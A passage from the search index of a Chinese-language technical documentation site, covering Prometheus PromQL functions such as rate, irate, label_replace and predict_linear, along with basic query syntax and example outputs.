<pre><code>irate(http_requests_total{job=\"api-server\"}[5m])\n</code></pre> <p>irate \u53ea\u80fd\u7528\u4e8e\u7ed8\u5236\u5feb\u901f\u53d8\u5316\u7684\u8ba1\u6570\u5668\uff0c\u5728\u957f\u671f\u8d8b\u52bf\u5206\u6790\u6216\u8005\u544a\u8b66\u4e2d\u66f4\u63a8\u8350\u4f7f\u7528 rate \u51fd\u6570\u3002\u56e0\u4e3a\u4f7f\u7528 irate \u51fd\u6570\u65f6\uff0c\u901f\u7387\u7684\u7b80\u77ed\u53d8\u5316\u4f1a\u91cd\u7f6e <code>FOR</code> \u8bed\u53e5\uff0c\u5f62\u6210\u7684\u56fe\u5f62\u6709\u5f88\u591a\u6ce2\u5cf0\uff0c\u96be\u4ee5\u9605\u8bfb\u3002</p> <p>[info] \u6ce8\u610f</p> <p>\u5f53\u5c06 <code>irate()</code> \u51fd\u6570\u4e0e\u805a\u5408\u8fd0\u7b97\u7b26\uff08\u4f8b\u5982 <code>sum()</code>\uff09\u6216\u968f\u65f6\u95f4\u805a\u5408\u7684\u51fd\u6570\uff08\u4efb\u4f55\u4ee5 <code>_over_time</code> \u7ed3\u5c3e\u7684\u51fd\u6570\uff09\u4e00\u8d77\u4f7f\u7528\u65f6\uff0c\u5fc5\u987b\u5148\u6267\u884c irate \u51fd\u6570\uff0c\u7136\u540e\u518d\u8fdb\u884c\u805a\u5408\u64cd\u4f5c\uff0c\u5426\u5219\u5f53\u91c7\u6837\u76ee\u6807\u91cd\u65b0\u542f\u52a8\u65f6 irate() \u65e0\u6cd5\u68c0\u6d4b\u5230\u8ba1\u6570\u5668\u662f\u5426\u88ab\u91cd\u7f6e\u3002</p>"},{"location":"kubernetes/20-promql-func/#label_join","title":"label_join()","text":"<p><code>label_join(v instant-vector, dst_label string, separator string, src_label_1 string, src_label_2 string, ...)</code> \u51fd\u6570\u53ef\u4ee5\u5c06\u65f6\u95f4\u5e8f\u5217 v \u4e2d\u591a\u4e2a\u6807\u7b7e <code>src_label</code> \u7684\u503c\uff0c\u901a\u8fc7 <code>separator</code> \u4f5c\u4e3a\u8fde\u63a5\u7b26\u5199\u5165\u5230\u4e00\u4e2a\u65b0\u7684\u6807\u7b7e <code>dst_label</code> \u4e2d\u3002\u53ef\u4ee5\u6709\u591a\u4e2a src_label \u6807\u7b7e\u3002</p> <p>\u4f8b\u5982\uff0c\u4ee5\u4e0b\u8868\u8fbe\u5f0f\u8fd4\u56de\u7684\u65f6\u95f4\u5e8f\u5217\u591a\u4e86\u4e00\u4e2a <code>foo</code> \u6807\u7b7e\uff0c\u6807\u7b7e\u503c\u4e3a <code>etcd,etcd-k8s</code>\uff1a</p> <pre><code>up{endpoint=\"api\",instance=\"192.168.123.248:2379\",job=\"etcd\",namespace=\"monitoring\",service=\"etcd-k8s\"}\n=&gt; up{endpoint=\"api\",instance=\"192.168.123.248:2379\",job=\"etcd\",namespace=\"monitoring\",service=\"etcd-k8s\"}  1\n\nlabel_join(up{endpoint=\"api\",instance=\"192.168.123.248:2379\",job=\"etcd\",namespace=\"monitoring\",service=\"etcd-k8s\"}, \"foo\", \",\", \"job\", \"service\")\n=&gt; up{endpoint=\"api\",foo=\"etcd,etcd-k8s\",instance=\"192.168.123.248:2379\",job=\"etcd\",namespace=\"monitoring\",service=\"etcd-k8s\"}  1\n</code></pre>"},{"location":"kubernetes/20-promql-func/#label_replace","title":"label_replace()","text":"<p>\u4e3a\u4e86\u80fd\u591f\u8ba9\u5ba2\u6237\u7aef\u7684\u56fe\u6807\u66f4\u5177\u6709\u53ef\u8bfb\u6027\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>label_replace</code> \u51fd\u6570\u4e3a\u65f6\u95f4\u5e8f\u5217\u6dfb\u52a0\u989d\u5916\u7684\u6807\u7b7e\u3002label_replace \u7684\u5177\u4f53\u53c2\u6570\u5982\u4e0b\uff1a</p> <pre><code>label_replace(v instant-vector, dst_label string, replacement string, src_label string, regex string)\n</code></pre> <p>\u8be5\u51fd\u6570\u4f1a\u4f9d\u6b21\u5bf9 v \u4e2d\u7684\u6bcf\u4e00\u6761\u65f6\u95f4\u5e8f\u5217\u8fdb\u884c\u5904\u7406\uff0c\u901a\u8fc7 <code>regex</code> \u5339\u914d src_label \u7684\u503c\uff0c\u5e76\u5c06\u5339\u914d\u90e8\u5206 <code>relacement</code> \u5199\u5165\u5230 dst_label \u6807\u7b7e\u4e2d\u3002\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>label_replace(up, \"host\", \"$1\", \"instance\",  \"(.*):.*\")\n</code></pre> <p>\u51fd\u6570\u5904\u7406\u540e\uff0c\u65f6\u95f4\u5e8f\u5217\u5c06\u5305\u542b\u4e00\u4e2a <code>host</code> \u6807\u7b7e\uff0chost \u6807\u7b7e\u7684\u503c\u4e3a Exporter \u5b9e\u4f8b\u7684 IP \u5730\u5740\uff1a</p> <pre><code>up{host=\"localhost\",instance=\"localhost:8080\",job=\"cadvisor\"}   1\nup{host=\"localhost\",instance=\"localhost:9090\",job=\"prometheus\"}   1\nup{host=\"localhost\",instance=\"localhost:9100\",job=\"node\"}   1\n</code></pre>"},{"location":"kubernetes/20-promql-func/#ln","title":"ln()","text":"<p><code>ln(v instant-vector)</code> \u8ba1\u7b97\u77ac\u65f6\u5411\u91cf v \u4e2d\u6240\u6709\u6837\u672c\u6570\u636e\u7684\u81ea\u7136\u5bf9\u6570\u3002\u7279\u6b8a\u60c5\u51b5\uff1a</p> <ul> <li><code>ln(+Inf) = +Inf</code></li> <li><code>ln(0) = -Inf</code></li> <li><code>ln(x &lt; 0) = NaN</code></li> <li><code>ln(NaN) = NaN</code></li> </ul>"},{"location":"kubernetes/20-promql-func/#log2","title":"log2()","text":"<p><code>log2(v instant-vector)</code> \u51fd\u6570\u8ba1\u7b97\u77ac\u65f6\u5411\u91cf v \u4e2d\u6240\u6709\u6837\u672c\u6570\u636e\u7684\u4e8c\u8fdb\u5236\u5bf9\u6570\u3002\u7279\u6b8a\u60c5\u51b5\u540c\u4e0a\u3002</p>"},{"location":"kubernetes/20-promql-func/#log10","title":"log10()","text":"<p><code>log10(v instant-vector)</code> \u8ba1\u7b97\u77ac\u65f6\u5411\u91cf v \u4e2d\u6240\u6709\u6837\u672c\u6570\u636e\u7684\u5341\u8fdb\u5236\u5bf9\u6570\u3002\u7279\u6b8a\u60c5\u51b5\u540c\u4e0a\u3002</p>"},{"location":"kubernetes/20-promql-func/#minute","title":"minute()","text":"<p><code>minute(v=vector(time()) instant-vector)</code> \u51fd\u6570\u8fd4\u56de\u7ed9\u5b9a UTC \u65f6\u95f4\u5f53\u524d\u5c0f\u65f6\u7684\u7b2c\u591a\u5c11\u5206\u949f\u3002\u7ed3\u679c\u8303\u56f4\uff1a0~59\u3002</p>"},{"location":"kubernetes/20-promql-func/#month","title":"month()","text":"<p><code>month(v=vector(time()) instant-vector)</code> \u51fd\u6570\u8fd4\u56de\u7ed9\u5b9a UTC \u65f6\u95f4\u5f53\u524d\u5c5e\u4e8e\u7b2c\u51e0\u4e2a\u6708\uff0c\u7ed3\u679c\u8303\u56f4\uff1a0~12\u3002</p>"},{"location":"kubernetes/20-promql-func/#predict_linear","title":"predict_linear()","text":"<p><code>predict_linear(v range-vector, t scalar)</code> \u51fd\u6570\u53ef\u4ee5\u9884\u6d4b\u65f6\u95f4\u5e8f\u5217 v \u5728 t \u79d2\u540e\u7684\u503c\u3002\u5b83\u57fa\u4e8e\u7b80\u5355\u7ebf\u6027\u56de\u5f52\u7684\u65b9\u5f0f\uff0c\u5bf9\u65f6\u95f4\u7a97\u53e3\u5185\u7684\u6837\u672c\u6570\u636e\u8fdb\u884c\u7edf\u8ba1\uff0c\u4ece\u800c\u53ef\u4ee5\u5bf9\u65f6\u95f4\u5e8f\u5217\u7684\u53d8\u5316\u8d8b\u52bf\u505a\u51fa\u9884\u6d4b\u3002\u8be5\u51fd\u6570\u7684\u8fd4\u56de\u7ed3\u679c**\u4e0d\u5e26\u6709\u5ea6\u91cf\u6307\u6807**\uff0c\u53ea\u6709\u6807\u7b7e\u5217\u8868\u3002</p> <p>\u4f8b\u5982\uff0c\u57fa\u4e8e 2 \u5c0f\u65f6\u7684\u6837\u672c\u6570\u636e\uff0c\u6765\u9884\u6d4b\u4e3b\u673a\u53ef\u7528\u78c1\u76d8\u7a7a\u95f4\u7684\u662f\u5426\u5728 4 \u4e2a\u5c0f\u65f6\u5019\u88ab\u5360\u6ee1\uff0c\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u8868\u8fbe\u5f0f\uff1a</p> <pre><code>predict_linear(node_filesystem_free{job=\"node\"}[2h], 4 * 3600) &lt; 0\n</code></pre> <p>\u901a\u8fc7\u4e0b\u9762\u7684\u4f8b\u5b50\u6765\u89c2\u5bdf\u8fd4\u56de\u503c\uff1a</p> <pre><code>predict_linear(http_requests_total{code=\"200\",instance=\"120.77.65.193:9090\",job=\"prometheus\",method=\"get\"}[5m], 5)\n\n# \u7ed3\u679c\n{code=\"200\",handler=\"query_range\",instance=\"120.77.65.193:9090\",job=\"prometheus\",method=\"get\"}  1\n{code=\"200\",handler=\"prometheus\",instance=\"120.77.65.193:9090\",job=\"prometheus\",method=\"get\"}   4283.449995397104\n{code=\"200\",handler=\"static\",instance=\"120.77.65.193:9090\",job=\"prometheus\",method=\"get\"}   22.99999999999999\n...\n</code></pre> <p>\u8fd9\u4e2a\u51fd\u6570\u4e00\u822c\u53ea\u7528\u5728 Gauge \u7c7b\u578b\u7684\u65f6\u95f4\u5e8f\u5217\u4e0a\u3002</p>"},{"location":"kubernetes/20-promql-func/#rate","title":"rate()","text":"<p><code>rate(v range-vector)</code> \u51fd\u6570\u53ef\u4ee5\u76f4\u63a5\u8ba1\u7b97\u533a\u95f4\u5411\u91cf v \u5728\u65f6\u95f4\u7a97\u53e3\u5185\u5e73\u5747\u589e\u957f\u901f\u7387\uff0c\u5b83\u4f1a\u5728\u5355\u8c03\u6027\u53d1\u751f\u53d8\u5316\u65f6(\u5982\u7531\u4e8e\u91c7\u6837\u76ee\u6807\u91cd\u542f\u5f15\u8d77\u7684\u8ba1\u6570\u5668\u590d\u4f4d)\u81ea\u52a8\u4e2d\u65ad\u3002\u8be5\u51fd\u6570\u7684\u8fd4\u56de\u7ed3\u679c**\u4e0d\u5e26\u6709\u5ea6\u91cf\u6307\u6807**\uff0c\u53ea\u6709\u6807\u7b7e\u5217\u8868\u3002</p> <p>\u4f8b\u5982\uff0c\u4ee5\u4e0b\u8868\u8fbe\u5f0f\u8fd4\u56de\u533a\u95f4\u5411\u91cf\u4e2d\u6bcf\u4e2a\u65f6\u95f4\u5e8f\u5217\u8fc7\u53bb 5 \u5206\u949f\u5185 HTTP \u8bf7\u6c42\u6570\u7684\u6bcf\u79d2\u589e\u957f\u7387\uff1a</p> <pre><code>rate(http_requests_total[5m])\n\n# \u7ed3\u679c\n{code=\"200\",handler=\"label_values\",instance=\"120.77.65.193:9090\",job=\"prometheus\",method=\"get\"} 0\n{code=\"200\",handler=\"query_range\",instance=\"120.77.65.193:9090\",job=\"prometheus\",method=\"get\"}  0\n{code=\"200\",handler=\"prometheus\",instance=\"120.77.65.193:9090\",job=\"prometheus\",method=\"get\"}   0.2\n...\n</code></pre> <p>rate() \u51fd\u6570\u8fd4\u56de\u503c\u7c7b\u578b\u53ea\u80fd\u7528\u8ba1\u6570\u5668\uff0c\u5728\u957f\u671f\u8d8b\u52bf\u5206\u6790\u6216\u8005\u544a\u8b66\u4e2d\u63a8\u8350\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\u3002</p> <p>[info] \u6ce8\u610f</p> <p>\u5f53\u5c06 <code>rate()</code> \u51fd\u6570\u4e0e\u805a\u5408\u8fd0\u7b97\u7b26\uff08\u4f8b\u5982 <code>sum()</code>\uff09\u6216\u968f\u65f6\u95f4\u805a\u5408\u7684\u51fd\u6570\uff08\u4efb\u4f55\u4ee5 <code>_over_time</code> \u7ed3\u5c3e\u7684\u51fd\u6570\uff09\u4e00\u8d77\u4f7f\u7528\u65f6\uff0c\u5fc5\u987b\u5148\u6267\u884c rate \u51fd\u6570\uff0c\u7136\u540e\u518d\u8fdb\u884c\u805a\u5408\u64cd\u4f5c\uff0c\u5426\u5219\u5f53\u91c7\u6837\u76ee\u6807\u91cd\u65b0\u542f\u52a8\u65f6 rate() \u65e0\u6cd5\u68c0\u6d4b\u5230\u8ba1\u6570\u5668\u662f\u5426\u88ab\u91cd\u7f6e\u3002</p>"},{"location":"kubernetes/20-promql-func/#resets","title":"resets()","text":"<p><code>resets(v range-vector)</code> \u7684\u53c2\u6570\u662f\u4e00\u4e2a\u533a\u95f4\u5411\u91cf\u3002\u5bf9\u4e8e\u6bcf\u4e2a\u65f6\u95f4\u5e8f\u5217\uff0c\u5b83\u90fd\u8fd4\u56de\u4e00\u4e2a\u8ba1\u6570\u5668\u91cd\u7f6e\u7684\u6b21\u6570\u3002\u4e24\u4e2a\u8fde\u7eed\u6837\u672c\u4e4b\u95f4\u7684\u503c\u7684\u51cf\u5c11\u88ab\u8ba4\u4e3a\u662f\u4e00\u6b21\u8ba1\u6570\u5668\u91cd\u7f6e\u3002</p> <p>\u8fd9\u4e2a\u51fd\u6570\u4e00\u822c\u53ea\u7528\u5728\u8ba1\u6570\u5668\u7c7b\u578b\u7684\u65f6\u95f4\u5e8f\u5217\u4e0a\u3002</p>"},{"location":"kubernetes/20-promql-func/#round","title":"round()","text":"<p><code>round(v instant-vector, to_nearest=1 scalar)</code> \u51fd\u6570\u4e0e <code>ceil</code> \u548c <code>floor</code> \u51fd\u6570\u7c7b\u4f3c\uff0c\u8fd4\u56de\u5411\u91cf\u4e2d\u6240\u6709\u6837\u672c\u503c\u7684\u6700\u63a5\u8fd1\u7684\u6574\u6570\u3002<code>to_nearest</code> \u53c2\u6570\u662f\u53ef\u9009\u7684,\u9ed8\u8ba4\u4e3a 1,\u8868\u793a\u6837\u672c\u8fd4\u56de\u7684\u662f\u6700\u63a5\u8fd1 1 \u7684\u6574\u6570\u500d\u7684\u503c\u3002\u4f60\u4e5f\u53ef\u4ee5\u5c06\u8be5\u53c2\u6570\u6307\u5b9a\u4e3a\u4efb\u610f\u503c\uff08\u4e5f\u53ef\u4ee5\u662f\u5c0f\u6570\uff09\uff0c\u8868\u793a\u6837\u672c\u8fd4\u56de\u7684\u662f\u6700\u63a5\u8fd1\u5b83\u7684\u6574\u6570\u500d\u7684\u503c\u3002</p>"},{"location":"kubernetes/20-promql-func/#scalar","title":"scalar()","text":"<p><code>scalar(v instant-vector)</code> \u51fd\u6570\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u5355\u5143\u7d20\u7684\u77ac\u65f6\u5411\u91cf,\u5b83\u8fd4\u56de\u5176\u552f\u4e00\u7684\u65f6\u95f4\u5e8f\u5217\u7684\u503c\u4f5c\u4e3a\u4e00\u4e2a\u6807\u91cf\u3002\u5982\u679c\u5ea6\u91cf\u6307\u6807\u7684\u6837\u672c\u6570\u91cf\u5927\u4e8e 1 \u6216\u8005\u7b49\u4e8e 0, \u5219\u8fd4\u56de <code>NaN</code>\u3002</p>"},{"location":"kubernetes/20-promql-func/#sort","title":"sort()","text":"<p><code>sort(v instant-vector)</code> \u51fd\u6570\u5bf9\u5411\u91cf\u6309\u5143\u7d20\u7684\u503c\u8fdb\u884c\u5347\u5e8f\u6392\u5e8f\uff0c\u8fd4\u56de\u7ed3\u679c\uff1akey: value = \u5ea6\u91cf\u6307\u6807\uff1a\u6837\u672c\u503c[\u5347\u5e8f\u6392\u5217]\u3002</p>"},{"location":"kubernetes/20-promql-func/#sort_desc","title":"sort_desc()","text":"<p><code>sort(v instant-vector)</code> \u51fd\u6570\u5bf9\u5411\u91cf\u6309\u5143\u7d20\u7684\u503c\u8fdb\u884c\u964d\u5e8f\u6392\u5e8f\uff0c\u8fd4\u56de\u7ed3\u679c\uff1akey: value = \u5ea6\u91cf\u6307\u6807\uff1a\u6837\u672c\u503c[\u964d\u5e8f\u6392\u5217]\u3002</p>"},{"location":"kubernetes/20-promql-func/#sqrt","title":"sqrt()","text":"<p><code>sqrt(v instant-vector)</code> \u51fd\u6570\u8ba1\u7b97\u5411\u91cf v \u4e2d\u6240\u6709\u5143\u7d20\u7684\u5e73\u65b9\u6839\u3002</p>"},{"location":"kubernetes/20-promql-func/#time","title":"time()","text":"<p><code>time()</code> \u51fd\u6570\u8fd4\u56de\u4ece 1970-01-01 \u5230\u73b0\u5728\u7684\u79d2\u6570\u3002\u6ce8\u610f\uff1a\u5b83\u4e0d\u662f\u76f4\u63a5\u8fd4\u56de\u5f53\u524d\u65f6\u95f4\uff0c\u800c\u662f\u65f6\u95f4\u6233</p>"},{"location":"kubernetes/20-promql-func/#timestamp","title":"timestamp()","text":"<p><code>timestamp(v instant-vector)</code> \u51fd\u6570\u8fd4\u56de\u5411\u91cf v \u4e2d\u7684\u6bcf\u4e2a\u6837\u672c\u7684\u65f6\u95f4\u6233\uff08\u4ece 1970-01-01 \u5230\u73b0\u5728\u7684\u79d2\u6570\uff09\u3002</p> <p>\u8be5\u51fd\u6570\u4ece Prometheus 2.0 \u7248\u672c\u5f00\u59cb\u5f15\u5165\u3002</p>"},{"location":"kubernetes/20-promql-func/#vector","title":"vector()","text":"<p><code>vector(s scalar)</code> \u51fd\u6570\u5c06\u6807\u91cf s \u4f5c\u4e3a\u6ca1\u6709\u6807\u7b7e\u7684\u5411\u91cf\u8fd4\u56de\uff0c\u5373\u8fd4\u56de\u7ed3\u679c\u4e3a\uff1akey: value= {}, s\u3002</p>"},{"location":"kubernetes/20-promql-func/#year","title":"year()","text":"<p><code>year(v=vector(time()) instant-vector)</code> \u51fd\u6570\u8fd4\u56de\u88ab\u7ed9\u5b9a UTC \u65f6\u95f4\u7684\u5f53\u524d\u5e74\u4efd\u3002</p>"},{"location":"kubernetes/20-promql-func/#aggregation_over_time","title":"<code>&lt;aggregation&gt;_over_time()</code>","text":"<p>\u4e0b\u9762\u7684\u51fd\u6570\u5217\u8868\u5141\u8bb8\u4f20\u5165\u4e00\u4e2a\u533a\u95f4\u5411\u91cf\uff0c\u5b83\u4eec\u4f1a\u805a\u5408\u6bcf\u4e2a\u65f6\u95f4\u5e8f\u5217\u7684\u8303\u56f4\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a\u77ac\u65f6\u5411\u91cf\uff1a</p> <ul> <li><code>avg_over_time(range-vector)</code> : \u533a\u95f4\u5411\u91cf\u5185\u6bcf\u4e2a\u5ea6\u91cf\u6307\u6807\u7684\u5e73\u5747\u503c\u3002</li> <li><code>min_over_time(range-vector)</code> : \u533a\u95f4\u5411\u91cf\u5185\u6bcf\u4e2a\u5ea6\u91cf\u6307\u6807\u7684\u6700\u5c0f\u503c\u3002</li> <li><code>max_over_time(range-vector)</code> : \u533a\u95f4\u5411\u91cf\u5185\u6bcf\u4e2a\u5ea6\u91cf\u6307\u6807\u7684\u6700\u5927\u503c\u3002</li> <li><code>sum_over_time(range-vector)</code> : \u533a\u95f4\u5411\u91cf\u5185\u6bcf\u4e2a\u5ea6\u91cf\u6307\u6807\u7684\u6c42\u548c\u3002</li> <li><code>count_over_time(range-vector)</code> : \u533a\u95f4\u5411\u91cf\u5185\u6bcf\u4e2a\u5ea6\u91cf\u6307\u6807\u7684\u6837\u672c\u6570\u636e\u4e2a\u6570\u3002</li> <li><code>quantile_over_time(scalar, range-vector)</code> : \u533a\u95f4\u5411\u91cf\u5185\u6bcf\u4e2a\u5ea6\u91cf\u6307\u6807\u7684\u6837\u672c\u6570\u636e\u503c\u5206\u4f4d\u6570\uff0c\u03c6-quantile (0 \u2264 \u03c6 \u2264 1)\u3002</li> <li><code>stddev_over_time(range-vector)</code> : \u533a\u95f4\u5411\u91cf\u5185\u6bcf\u4e2a\u5ea6\u91cf\u6307\u6807\u7684\u603b\u4f53\u6807\u51c6\u5dee\u3002</li> <li><code>stdvar_over_time(range-vector)</code> : \u533a\u95f4\u5411\u91cf\u5185\u6bcf\u4e2a\u5ea6\u91cf\u6307\u6807\u7684\u603b\u4f53\u6807\u51c6\u65b9\u5dee\u3002</li> </ul> <p>[info] \u6ce8\u610f</p> <p>\u5373\u4f7f\u533a\u95f4\u5411\u91cf\u5185\u7684\u503c\u5206\u5e03\u4e0d\u5747\u5300\uff0c\u5b83\u4eec\u5728\u805a\u5408\u65f6\u7684\u6743\u91cd\u4e5f\u662f\u76f8\u540c\u7684\u3002</p>"},{"location":"kubernetes/20-promql/","title":"PromQL","text":"<p>PromQL (Prometheus Query Language) \u662f Prometheus \u81ea\u5df1\u5f00\u53d1\u7684\u6570\u636e\u67e5\u8be2 DSL \u8bed\u8a00\uff0c\u8bed\u8a00\u8868\u73b0\u529b\u975e\u5e38\u4e30\u5bcc\uff0c\u5185\u7f6e\u51fd\u6570\u5f88\u591a\uff0c\u5728\u65e5\u5e38\u6570\u636e\u53ef\u89c6\u5316\u4ee5\u53carule \u544a\u8b66\u4e2d\u90fd\u4f1a\u4f7f\u7528\u5230\u5b83\u3002</p> <p>\u6458\u6284\u4e8e\u7f51\u53cb\u8d21\u732e\u3002</p> <p>\u5728\u9875\u9762 https://prometheus.8ops.top/graph \u4e2d</p> <pre><code>http_requests_total{code=\"200\"}\n</code></pre> <p>\u5b57\u7b26\u4e32\u548c\u6570\u5b57</p> <p>\u5b57\u7b26\u4e32: \u5728\u67e5\u8be2\u8bed\u53e5\u4e2d\uff0c\u5b57\u7b26\u4e32\u5f80\u5f80\u4f5c\u4e3a\u67e5\u8be2\u6761\u4ef6 labels \u7684\u503c\uff0c\u548c Golang \u5b57\u7b26\u4e32\u8bed\u6cd5\u4e00\u81f4\uff0c\u53ef\u4ee5\u4f7f\u7528 \"\", '', \u6216\u8005 `` </p> <pre><code>\"this is a string\"\n</code></pre>"},{"location":"kubernetes/20-promql/#_1","title":"\u4e00\u3001\u57fa\u672c\u6982\u5ff5","text":""},{"location":"kubernetes/20-promql/#11","title":"1.1 \u67e5\u8be2\u7ed3\u679c\u7c7b\u578b","text":"<p>PromQL \u67e5\u8be2\u7ed3\u679c\u4e3b\u8981\u6709 3 \u79cd\u7c7b\u578b</p> <ul> <li>\u77ac\u65f6\u6570\u636e (Instant vector): \u5305\u542b\u4e00\u7ec4\u65f6\u5e8f\uff0c\u6bcf\u4e2a\u65f6\u5e8f\u53ea\u6709\u4e00\u4e2a\u70b9\uff0c\u4f8b\u5982\uff1ahttp_requests_total</li> <li>\u533a\u95f4\u6570\u636e (Range vector): \u5305\u542b\u4e00\u7ec4\u65f6\u5e8f\uff0c\u6bcf\u4e2a\u65f6\u5e8f\u6709\u591a\u4e2a\u70b9\uff0c\u4f8b\u5982\uff1ahttp_requests_total[5m]</li> <li>\u7eaf\u91cf\u6570\u636e (Scalar): \u7eaf\u91cf\u53ea\u6709\u4e00\u4e2a\u6570\u5b57\uff0c\u6ca1\u6709\u65f6\u5e8f\uff0c\u4f8b\u5982\uff1acount(http_requests_total)</li> </ul>"},{"location":"kubernetes/20-promql/#12","title":"1.2 \u67e5\u8be2\u6761\u4ef6","text":"<p>Prometheus \u5b58\u50a8\u7684\u662f\u65f6\u5e8f\u6570\u636e\uff0c\u800c\u5b83\u7684\u65f6\u5e8f\u662f\u7531\u540d\u5b57\u548c\u4e00\u7ec4\u6807\u7b7e\u6784\u6210\u7684\uff0c\u5176\u5b9e\u540d\u5b57\u4e5f\u53ef\u4ee5\u5199\u51fa\u6807\u7b7e\u7684\u5f62\u5f0f\uff0c\u4f8b\u5982 http_requests_total \u7b49\u4ef7\u4e8e {name=\"http_requests_total\"}\u3002</p> <p>\u4e00\u4e2a\u7b80\u5355\u7684\u67e5\u8be2\u76f8\u5f53\u4e8e\u662f\u5bf9\u5404\u79cd\u6807\u7b7e\u7684\u7b5b\u9009</p> <pre><code>http_requests_total{code=\"200\"}      # \u8868\u793a\u67e5\u8be2\u540d\u5b57\u4e3a http_requests_total\uff0ccode \u4e3a \"200\" \u7684\u6570\u636e\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u67e5\u8be2\u6761\u4ef6\u652f\u6301\u6b63\u5219\u5339\u914d</p> <pre><code>http_requests_total{code!=\"200\"}     # \u8868\u793a\u67e5\u8be2 code \u4e0d\u4e3a \"200\" \u7684\u6570\u636e\nhttp_requests_total{code=\uff5e\"2..\"}    # \u8868\u793a\u67e5\u8be2 code \u4e3a \"2xx\" \u7684\u6570\u636e\nhttp_requests_total{code!\uff5e\"2..\"}    # \u8868\u793a\u67e5\u8be2 code \u4e0d\u4e3a \"2xx\" \u7684\u6570\u636e\n\u590d\u5236\u4ee3\u7801\n</code></pre>"},{"location":"kubernetes/20-promql/#13","title":"1.3 \u64cd\u4f5c\u7b26","text":"<p>Prometheus \u67e5\u8be2\u8bed\u53e5\u4e2d\uff0c\u652f\u6301\u5e38\u89c1\u7684\u5404\u79cd\u8868\u8fbe\u5f0f\u64cd\u4f5c\u7b26</p> <p>\u7b97\u672f\u8fd0\u7b97\u7b26</p> <pre><code>\u652f\u6301\u7684\u7b97\u672f\u8fd0\u7b97\u7b26\u6709 +\uff0c-\uff0c*\uff0c/\uff0c%\uff0c^, \u4f8b\u5982 http_requests_total * 2 \u8868\u793a\u5c06 http_requests_total \u6240\u6709\u6570\u636e double \u4e00\u500d\u3002\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u6bd4\u8f83\u8fd0\u7b97\u7b26</p> <pre><code>\u652f\u6301\u7684\u6bd4\u8f83\u8fd0\u7b97\u7b26\u6709 ==\uff0c!=\uff0c&gt;\uff0c&lt;\uff0c&gt;=\uff0c&lt;=, \u4f8b\u5982 http_requests_total &gt; 100 \u8868\u793a http_requests_total \u7ed3\u679c\u4e2d\u5927\u4e8e 100 \u7684\u6570\u636e\u3002\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u903b\u8f91\u8fd0\u7b97\u7b26</p> <pre><code>\u652f\u6301\u7684\u903b\u8f91\u8fd0\u7b97\u7b26\u6709 and\uff0cor\uff0cunless, \u4f8b\u5982 http_requests_total == 5 or http_requests_total == 2 \u8868\u793a http_requests_total \u7ed3\u679c\u4e2d\u7b49\u4e8e 5 \u6216\u8005 2 \u7684\u6570\u636e\u3002\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u805a\u5408\u8fd0\u7b97\u7b26</p> <pre><code>\u652f\u6301\u7684\u805a\u5408\u8fd0\u7b97\u7b26\u6709 sum\uff0cmin\uff0cmax\uff0cavg\uff0cstddev\uff0cstdvar\uff0ccount\uff0ccount_values\uff0cbottomk\uff0ctopk\uff0cquantile\uff0c, \u4f8b\u5982 max(http_requests_total) \u8868\u793a http_requests_total \u7ed3\u679c\u4e2d\u6700\u5927\u7684\u6570\u636e\u3002\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u6ce8\u610f:\u548c\u56db\u5219\u8fd0\u7b97\u7c7b\u578b\uff0cPrometheus \u7684\u8fd0\u7b97\u7b26\u4e5f\u6709\u4f18\u5148\u7ea7\uff0c\u5b83\u4eec\u9075\u4ece\uff08^\uff09&gt; (*, /, %) &gt; (+, -) &gt; (==, !=, &lt;=, &lt;, &gt;=, &gt;) &gt; (and, unless) &gt; (or) \u7684\u539f\u5219\u3002</p>"},{"location":"kubernetes/20-promql/#14","title":"1.4 \u5185\u7f6e\u51fd\u6570","text":"<p>Prometheus \u5185\u7f6e\u4e0d\u5c11\u51fd\u6570\uff0c\u65b9\u4fbf\u67e5\u8be2\u4ee5\u53ca\u6570\u636e\u683c\u5f0f\u5316\uff0c\u4f8b\u5982\u5c06\u7ed3\u679c\u7531\u6d6e\u70b9\u6570\u8f6c\u4e3a\u6574\u6570\u7684 floor \u548c ceil</p> <pre><code>- floor(avg(http_requests_total{code=\"200\"}))\n- ceil(avg(http_requests_total{code=\"200\"}))\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u67e5\u770b http_requests_total 5\u5206\u949f\u5185\uff0c\u5e73\u5747\u6bcf\u79d2\u6570\u636e</p> <pre><code>rate(http_requests_total[5m])\n\u590d\u5236\u4ee3\u7801\n</code></pre>"},{"location":"kubernetes/20-promql/#_2","title":"\u4e8c\u3001\u8bed\u6cd5\u8fdb\u9636","text":""},{"location":"kubernetes/20-promql/#21","title":"2.1 \u5373\u65f6\u77e2\u91cf\u9009\u62e9\u5668","text":"<ul> <li>=\uff1a\u5339\u914d\u4e0e\u6807\u7b7e\u76f8\u7b49\u7684\u5185\u5bb9</li> <li>!=\uff1a\u4e0d\u5339\u914d\u4e0e\u6807\u7b7e\u76f8\u7b49\u7684\u5185\u5bb9</li> <li>=~: \u6839\u636e\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u4e0e\u6807\u7b7e\u7b26\u5408\u7684\u5185\u5bb9</li> <li>!~\uff1a\u6839\u636e\u6b63\u5219\u8868\u8fbe\u5f0f\u4e0d\u5339\u914d\u4e0e\u6807\u7b7e\u7b26\u5408\u7684\u5185\u5bb9</li> </ul> <pre><code># \u8fd9\u5c06\u5339\u914dmethod\u4e0d\u7b49\u4e8eGET,environment\u5339\u914d\u5230staging\uff0ctesting\u6216development\u7684http_requests_total\u8bf7\u6c42\u5185\u5bb9\u3002\nhttp_requests_total{environment=~\"staging|testing|development\",method!=\"GET\"} \n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u5411\u91cf\u9009\u62e9\u5668\u5fc5\u987b\u6307\u5b9a\u4e00\u4e2a\u540d\u79f0\u6216\u81f3\u5c11\u4e00\u4e2a\u4e0e\u7a7a\u5b57\u7b26\u4e32\u4e0d\u5339\u914d\u7684\u6807\u7b7e\u5339\u914d\u5668</p> <pre><code># 